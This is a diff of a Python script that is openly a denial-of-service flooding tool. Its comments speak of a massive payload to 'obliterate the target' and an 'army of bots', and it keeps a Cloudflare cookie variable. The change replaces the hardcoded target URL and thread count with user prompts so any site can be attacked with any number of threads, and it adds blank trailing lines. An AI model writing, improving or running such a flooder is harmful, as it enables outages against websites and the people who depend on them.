@@ -3,7 +3,9 @@ import random
 import threading
 import time
 
-target_url = "http://your-website-url.com"  # Specify the URL of the target website
+target_url = input("Enter the URL of the target website: ")
+num_threads = int(input("Enter the number of threads to use for the attack: "))
+
 cloudflare_cookie = None
 
 # Generate an insanely massive payload to obliterate the target
@@ -49,7 +51,35 @@ def launch_attack():
             pass
 
 # Unleash the chaos using an unstoppable army of bots
-num_threads = 1000  # Specify the number of threads to conquer the target
 for _ in range(num_threads):
     thread = threading.Thread(target=launch_attack)
     thread.start()
+
+
+
+        
+
+
+                
+                    
+
+
+    
+                
+              
+          
+
+      
+                
+
+
+
+
+
+
+
+    
+
+    
+
+  
